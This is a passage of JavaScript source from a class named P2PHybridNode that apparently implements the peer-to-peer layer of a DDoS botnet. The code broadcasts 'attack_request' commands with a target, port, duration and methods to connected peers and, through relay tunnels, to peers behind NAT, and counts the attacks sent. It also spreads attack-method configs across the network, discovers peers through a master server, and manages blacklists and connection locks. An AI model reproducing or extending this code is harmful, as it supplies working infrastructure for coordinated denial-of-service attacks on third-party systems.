      for (const id of targetPeerIds) {
        if (this.peers.has(id)) directTargets.add(id);
        else if (this.knownReversePeers.has(id)) tunnelTargets.set(id, this.knownReversePeers.get(id));
      }
    } else {
      for (const [nodeId] of this.peers) {
        directTargets.add(nodeId);
      }
      for (const [reverseId, relayId] of this.knownReversePeers) {
        if (!directTargets.has(reverseId) && this.peers.has(relayId)) {
          tunnelTargets.set(reverseId, relayId);
        }
      }
    }

    const totalTargets = directTargets.size + tunnelTargets.size;
    if (totalTargets === 0) {
      return { success: false, error: 'No peers connected', summary: { totalTargets: 0, success: 0, failed: 0 }, results: [] };
    }

    console.log(
      `[P2P-ATTACK-BROADCAST] Broadcasting to ${directTargets.size} direct + ${tunnelTargets.size} tunnel target(s)`
    );
    this.stats.broadcastAttacksSent++;

    const results = [];
    let successCount = 0;
    let failedCount = 0;

    const directList = Array.from(directTargets);
    for (let i = 0; i < directList.length; i += maxParallel) {
      const batch = directList.slice(i, i + maxParallel);
      const batchResults = await Promise.all(
        batch.map(async (nodeId) => {
          try {
            const res = await this.requestAttackFromPeer(nodeId, target, time, port, methods);
            if (res?.success) { successCount++; }
            else { failedCount++; this.stats.broadcastAttacksFailed++; }
            return { nodeId, via: 'direct', success: !!res?.success, error: res?.error || null };
          } catch (err) {
            failedCount++; this.stats.broadcastAttacksFailed++;
            return { nodeId, via: 'direct', success: false, error: err.message };
          }
        })
      );
      results.push(...batchResults);
    }

    if (tunnelTargets.size > 0) {
      const tunnelList = Array.from(tunnelTargets.entries());
      const attackPayload = { type: 'attack_request', target, time, port, methods };

      for (let i = 0; i < tunnelList.length; i += maxParallel) {
        const batch = tunnelList.slice(i, i + maxParallel);
        const batchResults = await Promise.all(
          batch.map(async ([reverseId, relayId]) => {
            try {
              this.stats.tunnelAttacksSent++;
              const requestId = crypto.randomBytes(8).toString('hex');
              const fullPayload = { ...attackPayload, requestId };

              const tunnelResult = await this.sendViaTunnel(reverseId, fullPayload, 'attack_request');

              if (tunnelResult?.success) {
                successCount++;
                return { nodeId: reverseId, via: `tunnel:${relayId}`, success: true, error: null };
              } else {
                failedCount++; this.stats.broadcastAttacksFailed++;
                return { nodeId: reverseId, via: `tunnel:${relayId}`, success: false, error: tunnelResult?.error || 'Tunnel failed' };
              }
            } catch (err) {
              failedCount++; this.stats.broadcastAttacksFailed++;
              return { nodeId: reverseId, via: 'tunnel', success: false, error: err.message };
            }
          })
        );
        results.push(...batchResults);
      }
    }

    const summary = { totalTargets, direct: directTargets.size, tunnel: tunnelTargets.size, success: successCount, failed: failedCount };
    console.log('[P2P-ATTACK-BROADCAST] Done:', summary);

    return { success: successCount > 0, summary, results };
  }

  // ==========================================================
  // METHODS PROPAGATION — FIXED TO PREVENT FLOODING
  // ==========================================================

  propagateMethodsUpdateImmediate(excludeNodeId = null, versionHash = null, propagationChain = []) {
    const version = versionHash || this.methodsVersionHash;
    const localMethodsCount = Object.keys(this.methodsConfig).length;

    const newChain = propagationChain.includes(this.nodeId)
      ? propagationChain
      : [...propagationChain, this.nodeId];

    if (newChain.length >= this.p2pConfig.maxPropagationHops) return 0;

    // FIX: Track propagation per version to avoid double-propagating
    const now = Date.now();
    const lastPropagated = this._propagatedVersions.get(version);
    if (lastPropagated && (now - lastPropagated) < this.p2pConfig.propagationCooldown) {
      console.log(`[P2P-METHODS] Version ${version.substring(0, 8)} recently propagated (${Math.round((now - lastPropagated) / 1000)}s ago), skip re-propagation`);
      return 0;
    }
    this._propagatedVersions.set(version, now);

    let notified = 0;
    const notificationPromises = [];

    for (const [nodeId, peer] of this.peers) {
      if (excludeNodeId && nodeId === excludeNodeId) continue;
      if (newChain.includes(nodeId)) continue;

      // FIX: Skip peers that already have this version — no need to push
      if (peer.methodsVersion === version) {
        console.log(`[P2P-METHODS] Peer ${nodeId} already on version ${version.substring(0, 8)}, skip propagation`);
        continue;
      }

      const notification = {
        type: 'methods_update_notification',
        methodsVersion: version,
        methodsCount: localMethodsCount,
        sourceNodeId: excludeNodeId || this.nodeId,
        propagationChain: newChain,
        timestamp: Date.now(),
        urgent: true
      };

      const enc = this.encryptMessage(notification, 'methods_update_notification');
      const sent = this.sendToPeer(nodeId, enc.data);

      if (sent) {
        notified++;
        notificationPromises.push(this.sendMethodsConfigToPeer(nodeId, version, newChain));
      }
    }

    if (notified > 0) {
      console.log(`[P2P-METHODS] Propagated version ${version.substring(0, 8)} to ${notified} peer(s)`);
    }

    Promise.all(notificationPromises).catch(err => {
      console.error('[P2P-METHODS] Error in propagation:', err.message);
    });

    return notified;
  }

  // FIX: Skip push if peer already has this version
  async sendMethodsConfigToPeer(nodeId, versionHash, propagationChain = []) {
    try {
      const peer = this.peers.get(nodeId);
      // FIX: Don't push if peer already has this version
      if (peer && peer.methodsVersion === versionHash) {
        console.log(`[P2P-METHODS] Peer ${nodeId} already has version ${versionHash.substring(0, 8)}, skip push`);
        return false;
      }

      const message = {
        type: 'methods_push',
        nodeId: this.nodeId,
        methods: this.methodsConfig,
        methodsVersion: versionHash,
        methodsCount: Object.keys(this.methodsConfig).length,
        propagationChain,
        timestamp: Date.now()
      };

      const enc = this.encryptMessage(message, 'methods_push');
      const sent = this.sendToPeer(nodeId, enc.data);
      if (sent) this.stats.filesShared++;
      return sent;
    } catch (error) {
      console.error(`[P2P-METHODS] Failed to push config to ${nodeId}:`, error.message);
      return false;
    }
  }

  async syncMethodsFromPeers() {
    if (this.peers.size === 0) {
      return { success: false, error: 'No peers connected' };
    }

    let bestPeer = null;
    let maxMethods = Object.keys(this.methodsConfig).length;

    for (const [nodeId, peer] of this.peers) {
      if (peer.methodsCount > maxMethods) {
        bestPeer = nodeId;
        maxMethods = peer.methodsCount;
      }
    }

    if (!bestPeer) {
      return { success: false, error: 'No peer with newer methods' };
    }

    const result = await this.requestMethodsFromPeer(bestPeer);
    if (result && result.success !== false) {
      this.stats.lastMethodSync = this.stats.lastMethodSync || Date.now();
      return { success: true, fromPeer: bestPeer };
    }
    return { success: false, error: result?.error || 'Sync failed' };
  }

  // ==========================================================
  // PEER DISCOVERY & AUTO-CONNECT
  // ==========================================================

  startPeerDiscovery() {
    if (this.discoveryInterval) clearInterval(this.discoveryInterval);

    console.log(`[P2P-DISCOVERY] Starting peer discovery every ${this.p2pConfig.discoveryInterval}ms`);

    setTimeout(() => this.discoverPeers(), 5000);

    this.discoveryInterval = setInterval(() => {
      if (!this.isShuttingDown) this.discoverPeers();
    }, this.p2pConfig.discoveryInterval);
  }

  async discoverPeers() {
    await this._doMasterSignaling();
  }

  startAutoConnector() {
    if (!this.p2pConfig.autoConnect) return;
    if (this.autoConnectInterval) clearInterval(this.autoConnectInterval);

    console.log(`[P2P-AUTO] Starting auto-connector`);

    setTimeout(() => this.autoConnectToPeers(), this.p2pConfig.autoConnectDelay);

    this.autoConnectInterval = setInterval(() => {
      if (!this.isShuttingDown) this.autoConnectToPeers();
    }, this.p2pConfig.autoConnectDelay);
  }

  async autoConnectToPeers() {
    if (this.isShuttingDown) return;

    const totalConnections = this.peers.size + this.connectionLocks.size;
    if (totalConnections >= this.p2pConfig.maxPeers) return;

    const availablePeers = Array.from(this.knownPeers.values())
      .filter(peer => {
        return peer.canConnectTo &&
          peer.nodeId !== this.nodeId &&
          peer.ip &&
          peer.port &&
          !this.peers.has(peer.nodeId) &&
          !this.connectionLocks.has(peer.nodeId) &&
          !this.isBlacklisted(peer.nodeId);
      })
      .sort((a, b) => {
        if (a.fromReferral && !b.fromReferral) return -1;
        if (!a.fromReferral && b.fromReferral) return 1;
        return b.lastUpdate - a.lastUpdate;
      })
      .slice(0, this.p2pConfig.maxPeers - totalConnections);

    if (availablePeers.length === 0) return;

    console.log(`[P2P-AUTO] Auto-connecting to ${availablePeers.length} peer(s)...`);
    this.stats.lastAutoConnect = Date.now();

    const maxParallel = 3;
    for (let i = 0; i < availablePeers.length; i += maxParallel) {
      if (this.isShuttingDown) break;

      const currentTotal = this.peers.size + this.connectionLocks.size;
      if (currentTotal >= this.p2pConfig.maxPeers) break;

      const batch = availablePeers.slice(i, i + maxParallel);

      await Promise.all(batch.map(async peer => {
        try {
          const result = await this.connectToPeer(peer.nodeId, peer);
          if (result.success && !result.existing) {
            console.log(`[P2P-AUTO] Connected to ${peer.nodeId} (${peer.ip}:${peer.port})`);
            if (peer.fromReferral) this.stats.connectionsViaReferral++;
          }
        } catch (error) {
          console.error(`[P2P-AUTO] Error connecting to ${peer.nodeId}:`, error.message);
        }
      }));

      if (i + maxParallel < availablePeers.length) {
        await new Promise(r => setTimeout(r, 2000));
      }
    }

    if (this.nodeMode === 'REVERSE') {
      this._scheduleReverseOutboundConnect();
    }
  }

  // ==========================================================
  // PEER CLEANUP, HEARTBEAT, HANDLER CLEANUP
  // ==========================================================

  startPeerCleanup() {
    if (this.peerCleanupInterval) clearInterval(this.peerCleanupInterval);

    this.peerCleanupInterval = setInterval(() => {
      if (this.isShuttingDown) return;

      const now = Date.now();
      const timeout = this.p2pConfig.peerTimeout;

      let removedKnown = 0;
      for (const [nodeId, peer] of this.knownPeers) {
        if (now - peer.lastUpdate > timeout * 2) {
          this.knownPeers.delete(nodeId);
          removedKnown++;
        }
      }

      let removedConnections = 0;
      for (const [nodeId, peer] of this.peers) {
        if (now - peer.lastSeen > timeout) {
          console.log(`[P2P-CLEANUP] Peer ${nodeId} timed out`);
          try { peer.ws.close(); } catch {}
          this.peers.delete(nodeId);
          this.connectionLocks.delete(nodeId);
          this.reversePeers.delete(nodeId);
          removedConnections++;
        }
      }

      for (const [nodeId, lockTime] of this.connectionLocks) {
        if (now - lockTime > this.p2pConfig.connectionLockTimeout) {
          this.connectionLocks.delete(nodeId);
        }
      }

      for (const [nodeId, queue] of this.messageQueue) {
        const filtered = queue.filter(item => now - item.timestamp < 300000);
        if (filtered.length === 0) this.messageQueue.delete(nodeId);
        else if (filtered.length < queue.length) this.messageQueue.set(nodeId, filtered);
      }

      for (const [nodeId, entry] of this.peerBlacklist) {
        if (now > entry.until) this.peerBlacklist.delete(nodeId);
      }

      for (const [version, timestamp] of this.methodUpdatePropagationLock) {
        if (now - timestamp > this.p2pConfig.propagationCooldown) {
          this.methodUpdatePropagationLock.delete(version);
        }
      }

      // FIX: Clean old propagated version records
      for (const [version, timestamp] of this._propagatedVersions) {
        if (now - timestamp > this.p2pConfig.propagationCooldown * 2) {
          this._propagatedVersions.delete(version);
        }
      }

      for (const [nodeId] of this.reversePeers) {
        if (!this.peers.has(nodeId)) {
          this.reversePeers.delete(nodeId);
        }
      }

    }, this.p2pConfig.cleanupInterval);

    console.log('[P2P-CLEANUP] Peer cleanup started');
  }

  startPeerHeartbeat() {
    if (this.heartbeatInterval) clearInterval(this.heartbeatInterval);

    this.heartbeatInterval = setInterval(() => {
      if (this.isShuttingDown) return;

      for (const [nodeId, peer] of this.peers) {
        try {
          if (peer.ws.readyState === WebSocket.OPEN) {
            peer.ws.ping();
          }
        } catch (error) {
          console.error(`[P2P-HEARTBEAT] Error pinging ${nodeId}:`, error.message);
        }
      }

      const now = Date.now();
      if (!this.lastMasterCheck || (now - this.lastMasterCheck > 60000)) {
        this.checkMasterConnectivity();
      }

      if (this.reversePeers.size > 0 && this.peers.size > 0) {
        this.broadcastReverseList();
      }

    }, this.p2pConfig.heartbeatInterval);

    console.log(`[P2P-HEARTBEAT] Heartbeat started (${this.p2pConfig.heartbeatInterval}ms)`);
  }

  startHandlerCleanup() {
    if (this.handlerCleanupInterval) clearInterval(this.handlerCleanupInterval);

    this.handlerCleanupInterval = setInterval(() => {
      if (this.isShuttingDown) return;

      const now = Date.now();
      const timeout = 60000;
      let cleaned = 0;

      for (const [key, timestamp] of this.requestHandlerTimestamps) {
        if (now - timestamp > timeout) {
          const handlerInfo = this.requestHandlers.get(key);
          if (handlerInfo) {
            const { eventName, handler } = handlerInfo;
            this.removeListener(eventName, handler);
            this.requestHandlers.delete(key);
            this.requestHandlerTimestamps.delete(key);
            cleaned++;
            this.stats.requestHandlersCleaned++;
          }
        }
      }

      if (cleaned > 0) {
        console.log(`[P2P-CLEANUP] Cleaned ${cleaned} stale request handlers`);
        this.stats.memoryLeaksPrevent++;
      }
    }, 30000);
  }

  // FIX: startMethodSyncChecker — only trigger sync if version actually differs
  startMethodSyncChecker() {
    if (this.methodSyncInterval) clearInterval(this.methodSyncInterval);

    this.methodSyncInterval = setInterval(async () => {
      if (this.isShuttingDown || !this.p2pConfig.preferP2PSync) return;
      if (this.peers.size === 0) return;

      const localCount = Object.keys(this.methodsConfig).length;
      let bestPeer = null;
      let bestCount = localCount;

      for (const [nodeId, peer] of this.peers) {
        // FIX: Only consider peers with a DIFFERENT version AND more methods
        if (peer.methodsVersion &&
            peer.methodsVersion !== this.methodsVersionHash &&
            peer.methodsCount > bestCount) {
          bestPeer = nodeId;
          bestCount = peer.methodsCount;
        }
      }

      if (!bestPeer) {
        // All peers are on same or older version — nothing to do
        return;
      }

      // FIX: Don't re-request if we already have a pending request for this version
      const bestPeerVersion = this.peers.get(bestPeer)?.methodsVersion;
      if (this._pendingMethodsRequestVersion && this._pendingMethodsRequestVersion === bestPeerVersion) {
        console.log(`[P2P-SYNC-CHECK] Already requesting version ${bestPeerVersion?.substring(0, 8)}, skip`);
        return;
      }

      console.log(`[P2P-SYNC-CHECK] Detected newer methods from peer ${bestPeer} (${bestCount} vs ${localCount}), syncing...`);
      await this.syncMethodsFromPeers();
    }, this.p2pConfig.methodSyncInterval);
  }

  // ==========================================================
  // SEND / QUEUE / BROADCAST
  // ==========================================================

  sendToPeer(nodeId, message) {
    const peer = this.peers.get(nodeId);
    if (!peer || !peer.connected) {
      this.queueMessage(nodeId, message);
      return false;
    }

    try {
      if (peer.ws.readyState === WebSocket.OPEN) {
        const msgStr = JSON.stringify(message);
        peer.ws.send(msgStr);
        peer.messagesSent++;

        if (message && message.envelope === 'secure') {
          this.stats.encryptedMessagesSent++;
        } else {
          this.stats.plainMessagesSent++;
        }
        this.stats.messagesSent++;
        return true;
      }

      this.queueMessage(nodeId, message);
      return false;
    } catch (error) {
      console.error(`[P2P] Failed to send to ${nodeId}:`, error.message);
      this.queueMessage(nodeId, message);
      return false;
    }
  }

  queueMessage(nodeId, message) {
    if (!this.messageQueue.has(nodeId)) this.messageQueue.set(nodeId, []);

    const queue = this.messageQueue.get(nodeId);
    if (queue.length >= this.p2pConfig.messageQueueSize) queue.shift();

    queue.push({ message, timestamp: Date.now() });
    this.stats.messagesQueued++;
  }

  processQueuedMessages(nodeId) {
    const queue = this.messageQueue.get(nodeId);
    if (!queue || queue.length === 0) {
      this.messageQueue.delete(nodeId);
      return;
    }

    const peer = this.peers.get(nodeId);
    if (!peer || !peer.ws || peer.ws.readyState !== WebSocket.OPEN) return;

    console.log(`[P2P] Processing ${queue.length} queued messages for ${nodeId}`);

    let sent = 0;
    for (const item of queue) {
      try {
        peer.ws.send(JSON.stringify(item.message));
        peer.messagesSent++;
        if (item.message && item.message.envelope === 'secure') {
          this.stats.encryptedMessagesSent++;
        } else {
          this.stats.plainMessagesSent++;
        }
        this.stats.messagesSent++;
        sent++;
      } catch (error) {
        console.error(`[P2P] Failed to flush queued message to ${nodeId}:`, error.message);
      }
    }

    this.messageQueue.delete(nodeId);
    console.log(`[P2P] Flushed ${sent} queued messages to ${nodeId}`);
  }

  broadcastToPeers(message, excludeNodeId = null) {
    let sent = 0;
    const enc = this.encryptMessage(message, message.type || 'broadcast');

    for (const [nodeId] of this.peers) {
      if (excludeNodeId && nodeId === excludeNodeId) continue;
      if (this.sendToPeer(nodeId, enc.data)) sent++;
    }

    return sent;
  }

  // ==========================================================
  // UTILITIES
  // ==========================================================

  normalizePort(port) {
    if (typeof port === 'string') {
      const parsed = parseInt(port, 10);
      return Number.isNaN(parsed) ? null : parsed;
    }
    return typeof port === 'number' ? port : null;
  }

  // Cek apakah peer di-lock (temporary blacklist ATAU permanent failure lock)
  isBlacklisted(nodeId) {
    // Permanent failure lock — tidak expire otomatis
    if (this.permanentFailureLocks.has(nodeId)) return true;

    // Temporary blacklist (ada TTL)
    const entry = this.peerBlacklist.get(nodeId);
    if (!entry) return false;
    if (Date.now() > entry.until) {
      this.peerBlacklist.delete(nodeId);
      return false;
    }
    return true;
  }

  // Cek spesifik apakah peer di-permanent-lock
  isPermanentlyLocked(nodeId) {
    return this.permanentFailureLocks.has(nodeId);
  }

  // Temporary blacklist dengan TTL (untuk kasus selain gagal konek)
  blacklistPeer(nodeId, reason, duration = null) {
    const until = Date.now() + (duration || this.p2pConfig.blacklistDuration);
    this.peerBlacklist.set(nodeId, { reason, until });
    console.log(`[P2P-BLACKLIST] Peer ${nodeId} blacklisted: ${reason} (${Math.round((duration || this.p2pConfig.blacklistDuration) / 1000)}s)`);
  }

  // Kunci permanen — hanya dibuka saat peer itu minta join inbound ke kita
  _permanentlyLockPeer(nodeId, attempts) {
    const entry = {
      lockedAt: Date.now(),
      lockedAtISO: new Date().toISOString(),
      attempts,
      reason: `Gagal konek ${attempts}x berturut-turut`
    };
    this.permanentFailureLocks.set(nodeId, entry);
    this.stats.permanentLocksTotal++;
    console.log(`[P2P-LOCK] ⛔ PERMANENT LOCK: ${nodeId} (gagal ${attempts}x) — hanya dibuka jika peer ini join inbound`);
  }

  // Catat kegagalan outbound; kunci permanen jika sudah >= maxConnectionAttempts
  _recordOutboundFailure(nodeId) {
    const prev = this._outboundFailureCounts.get(nodeId) || 0;
    const next = prev + 1;
    this._outboundFailureCounts.set(nodeId, next);

    const max = this.p2pConfig.maxConnectionAttempts || 3;
    console.log(`[P2P-LOCK] Peer ${nodeId} outbound failure ${next}/${max}`);

    if (next >= max) {
      this._permanentlyLockPeer(nodeId, next);
    }
  }

  // Reset failure count dan unlock permanent lock — dipanggil saat peer berhasil konek inbound
  _unlockPeerByInbound(nodeId) {
    const wasLocked = this.permanentFailureLocks.has(nodeId);
    const lockEntry = this.permanentFailureLocks.get(nodeId);

    this.permanentFailureLocks.delete(nodeId);
    this._outboundFailureCounts.delete(nodeId);
    this.peerBlacklist.delete(nodeId); // bersihkan juga temporary blacklist kalau ada

    if (wasLocked) {
      this.stats.permanentLockUnlockedByInbound++;
      console.log(
        `[P2P-LOCK] ✅ UNLOCKED: ${nodeId} berhasil join inbound ` +
        `(sebelumnya dikunci sejak ${lockEntry?.lockedAtISO || 'unknown'}, ${lockEntry?.attempts || '?'}x gagal)`
      );
    }

    return wasLocked;
  }

  handlePeerDisconnected(nodeId, code, reason) {
    if (!this.peers.has(nodeId) && !this.connectionLocks.has(nodeId)) return;

    this.peers.delete(nodeId);
    this.connectionLocks.delete(nodeId);
    this.reversePeers.delete(nodeId);

    for (const [reverseId, relayId] of this.knownReversePeers) {
      if (relayId === nodeId) {
        this.knownReversePeers.delete(reverseId);
      }
    }

    this.emit('peer_disconnected', { nodeId, code, reason: reason?.toString() || 'Unknown' });
  }

  getPeerReferrals(excludeNodeId = null) {
    const referrals = [];

    for (const [nodeId, peer] of this.knownPeers) {
      if (nodeId === this.nodeId) continue;
      if (excludeNodeId && nodeId === excludeNodeId) continue;
      if (this.isBlacklisted(nodeId)) continue;
      if (peer.mode === 'REVERSE' || !peer.canConnectTo) continue;

      referrals.push({
        nodeId: peer.nodeId,
        ip: peer.ip,
        port: peer.port,
        mode: peer.mode,
        lastSeen: peer.lastUpdate,
        methodsCount: peer.methodsCount || 0
      });

      if (referrals.length >= this.p2pConfig.maxReferralsToSend) break;
    }

    return referrals;
  }

  async checkMasterConnectivity() {
    if (!this.config.MASTER?.URL) {
      this.masterReachable = false;
      return false;
    }

    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);
      const response = await globalThis.fetch(`${this.config.MASTER.URL}/api/status`, { signal: controller.signal });
      clearTimeout(timeout);
      this.masterReachable = response.ok;
      this.lastMasterCheck = Date.now();
      return this.masterReachable;
    } catch (error) {
      this.masterReachable = false;
      this.lastMasterCheck = Date.now();
      return false;
    }
  }

  // ==========================================================
  // STATUS
  // ==========================================================

  getStatus() {
    const methodsCount = Object.keys(this.methodsConfig).length;
    const messageQueueTotal = Array.from(this.messageQueue.values()).reduce(
      (sum, q) => sum + q.length, 0
    );
    const totalSent = this.stats.messagesSent;
    const totalReceived = this.stats.messagesReceived;

    // FIX: Compute peer breakdown safely
    const peersArray = Array.from(this.peers.values());
    const directPeerCount = peersArray.filter(p => p.remoteMode === 'DIRECT' || !p.remoteMode).length;
    const reversePeerCount = peersArray.filter(p => p.remoteMode === 'REVERSE').length;

    // FIX: lastMethodSync was typed as null but stored as Date.now() (number)
    // Normalize to ISO string or null for consistent reading
    const lastMethodSyncISO = this.stats.lastMethodSync
      ? new Date(this.stats.lastMethodSync).toISOString()
      : null;

    return {
      enabled: this.p2pConfig.enabled,
      nodeId: this.nodeId,
      nodeIp: this.nodeIp,
      nodePort: this.nodePort,
      // FIX: Use actual nodeMode; default to 'DIRECT' if somehow unset
      nodeMode: this.nodeMode || 'DIRECT',
      serverReady: this.isServerReady,
      // FIX: masterReachable and nodeReachable both explicitly included and read
      // from their respective instance properties (both now initialized in constructor)
      masterReachable: this.masterReachable,
      nodeReachable: this.nodeReachable,
      nodeReachableLastChecked: this.nodeReachableLastChecked
        ? new Date(this.nodeReachableLastChecked).toISOString()
        : null,
      encryption: this.isEncryptionEnabled(),
      // FIX: Include full hash AND short form for debugging
      methodsVersionFull: this.methodsVersionHash || null,
      methodsVersion: this.methodsVersionHash ? this.methodsVersionHash.substring(0, 8) : null,
      methodsCount,
      preferP2PSync: this.p2pConfig.preferP2PSync,
      // FIX: Pending sync state — useful for debugging flood issues
      pendingMethodsRequestVersion: this._pendingMethodsRequestVersion
        ? this._pendingMethodsRequestVersion.substring(0, 8)
        : null,
      peers: {
        connected: this.peers.size,
        known: this.knownPeers.size,
        max: this.p2pConfig.maxPeers,
        locks: this.connectionLocks.size,
        blacklisted: this.peerBlacklist.size,
        permanentlyLocked: this.permanentFailureLocks.size,
        reversePool: this.reversePeers.size,
        directPeers: directPeerCount,
        reversePeers: reversePeerCount,
        knownReversePeers: this.knownReversePeers.size,
      },
      messageQueue: { peers: this.messageQueue.size, totalMessages: messageQueueTotal },
      stats: {
        ...this.stats,
        // FIX: Normalize lastMethodSync to readable ISO string
        lastMethodSync: lastMethodSyncISO,
        lastDiscovery: this.stats.lastDiscovery
          ? new Date(this.stats.lastDiscovery).toISOString()
          : null,
        lastAutoConnect: this.stats.lastAutoConnect
          ? new Date(this.stats.lastAutoConnect).toISOString()
          : null,
        successRate: this.stats.connectionAttempts > 0
          ? ((this.stats.connectionSuccesses / this.stats.connectionAttempts) * 100).toFixed(2) + '%'
          : '0.00%',
        encryptionRate: totalSent > 0
          ? ((this.stats.encryptedMessagesSent / totalSent) * 100).toFixed(2) + '%'
          : '0.00%',
        // FIX: Add receive stats for completeness
        encryptionReceiveRate: totalReceived > 0
          ? ((this.stats.encryptedMessagesReceived / totalReceived) * 100).toFixed(2) + '%'
          : '0.00%'
      },
      config: {
        autoConnect: this.p2pConfig.autoConnect,
        relayFallback: this.p2pConfig.relayFallback,
        maxPeers: this.p2pConfig.maxPeers,
        discoveryInterval: this.p2pConfig.discoveryInterval,
        reverseP2PEnabled: this.p2pConfig.reverseP2PEnabled,
        masterSignalingEnabled: this.p2pConfig.masterSignalingEnabled,
        methodSyncInterval: this.p2pConfig.methodSyncInterval,
        propagationCooldown: this.p2pConfig.propagationCooldown
      },
      connectedPeers: Array.from(this.peers.entries()).map(([nodeId, peer]) => ({
        nodeId,
        ip: peer.ip,
        port: peer.port,
        ourMode: peer.mode,
        remoteMode: peer.remoteMode || 'DIRECT',
        isReverseNode: peer.isReverseNode || false,
        isOutbound: peer.isOutbound || false,
        isRelayProvider: peer.isRelayProvider || false,
        direct: peer.direct,
        lastSeen: peer.lastSeen ? new Date(peer.lastSeen).toISOString() : null,
        connectedAt: peer.connectedAt ? new Date(peer.connectedAt).toISOString() : null,
        // FIX: Protect against connectedAt being null/undefined
        uptimeSeconds: peer.connectedAt ? Math.floor((Date.now() - peer.connectedAt) / 1000) : null,
        methodsVersion: peer.methodsVersion ? peer.methodsVersion.substring(0, 8) : null,
        methodsCount: peer.methodsCount || 0,
        versionInSync: peer.methodsVersion
          ? peer.methodsVersion === this.methodsVersionHash
          : null,
        supportsEncryption: peer.supportsEncryption,
        supportsTunnel: peer.supportsTunnel || false
      })),
      knownPeers: Array.from(this.knownPeers.values()).map(peer => ({
        nodeId: peer.nodeId,
        ip: peer.ip,
        port: peer.port,
        mode: peer.mode,
        reachable: peer.reachable,
        canConnectTo: peer.canConnectTo,
        connected: this.peers.has(peer.nodeId),
        blacklisted: this.isBlacklisted(peer.nodeId),
        permanentlyLocked: this.isPermanentlyLocked(peer.nodeId),
        methodsCount: peer.methodsCount || 0,
        // FIX: Include lastUpdate in known peer info
        lastUpdate: peer.lastUpdate ? new Date(peer.lastUpdate).toISOString() : null
      })),
      permanentlyLockedPeers: Array.from(this.permanentFailureLocks.entries()).map(([nodeId, entry]) => ({
        nodeId,
        lockedAt: entry.lockedAtISO,
        attempts: entry.attempts,
        reason: entry.reason,
        unlockCondition: 'Peer harus minta join inbound ke node ini'
      }))
    };
  }

  // ==========================================================
  // SHUTDOWN / CLEANUP
  // ==========================================================

  cleanup() {
    if (this.wss) {
      try { this.wss.close(); } catch {}
      this.wss = null;
    }
    this.isServerReady = false;
  }

  shutdown() {
    console.log('[P2P] Shutting down P2P node...');
    this.isShuttingDown = true;

    const intervals = [
      'discoveryInterval', 'peerCleanupInterval', 'heartbeatInterval',
      'autoConnectInterval', 'methodSyncInterval', 'handlerCleanupInterval',
      'reverseReconnectInterval', 'masterSignalingInterval'
    ];

    for (const name of intervals) {
      if (this[name]) {
        clearInterval(this[name]);
        this[name] = null;
      }
    }

    for (const [, value] of this.requestHandlers) {
      const { eventName, handler } = value;
      this.removeListener(eventName, handler);
    }
    this.requestHandlers.clear();
    this.requestHandlerTimestamps.clear();

    const goodbyeMessage = { type: 'goodbye', nodeId: this.nodeId, timestamp: Date.now() };

    for (const [nodeId, peer] of this.peers) {
      try {
        const enc = this.encryptMessage(goodbyeMessage, 'goodbye');
        this.sendToPeer(nodeId, enc.data);
        setTimeout(() => { try { peer.ws.close(); } catch {} }, 500);
      } catch {}
    }

    setTimeout(() => {
      this.peers.clear();
      this.knownPeers.clear();
      this.connectionLocks.clear();
      this.messageQueue.clear();
      this.peerBlacklist.clear();
      this.receivedReferrals.clear();
      this.referralTimestamps.clear();
      this.methodUpdatePropagationLock.clear();
      this.reversePeers.clear();
      this._propagatedVersions.clear();
      this.permanentFailureLocks.clear();
      this._outboundFailureCounts.clear();
    }, 1000);

    this.cleanup();
    this.removeAllListeners();

    console.log('[P2P] P2P node shutdown complete');
  }
}

export default P2PHybridNode;